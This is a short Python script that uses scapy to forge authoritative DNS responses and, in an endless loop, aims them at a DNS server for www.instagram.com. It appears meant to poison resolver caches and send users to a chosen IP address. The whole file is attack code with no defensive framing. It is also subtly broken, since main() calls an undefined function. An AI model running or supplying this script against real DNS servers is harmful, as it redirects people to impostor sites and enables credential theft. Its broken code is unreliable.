from scapy.all import *

def send_spoofed_response(server_ip: str, query_domain: str, spoofed_ip: str) -> None:
    """
    Sends a spoofed DNS response to the specified server for the specified domain with the specified IP.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to spoof.
        spoofed_ip (str): The IP address to use in the spoofed response.
    """
    try:
        dns_response = IP(dst=server_ip)/UDP(dport=53)/DNS(
            id=20000,
            qr=1,
            aa=1,
            qd=DNSQR(qname=query_domain),
            an=DNSRR(rrname=query_domain, ttl=300, rdata=spoofed_ip)
        )
        send(dns_response)
        print(f"Sent spoofed response for {query_domain} with IP {spoofed_ip} to {server_ip}")

    except Exception as e:
        print("Error: ", e)
        
        
def main():
    while True:
        send_dns_query("10.0.0.150", "www.instagram.com", "129.168.56.12")
        

if __name__ == "__main__":
    main()